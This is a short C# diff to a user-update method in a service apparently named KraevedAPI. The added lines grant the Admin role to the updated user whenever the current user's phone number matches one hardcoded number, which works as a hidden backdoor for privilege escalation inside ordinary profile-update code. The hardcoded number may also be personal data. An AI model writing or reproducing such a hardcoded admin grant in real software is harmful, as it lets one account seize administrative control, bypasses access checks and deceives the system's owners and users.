@@ -29,6 +29,12 @@ namespace KraevedAPI.Service
                 user.Surname = userInDto.Surname;
             }
 
+            var currentUser = GetCurrentUser();
+            if (currentUser.Phone == "9105968117") {
+                var adminRole = _unitOfWork.RolesRepository.GetRoleByName(ServiceConstants.Roles.Admin.Name);
+                user.Role = adminRole;
+            }
+
             _unitOfWork.UsersRepository.Update(user);
             await _unitOfWork.SaveAsync();
 
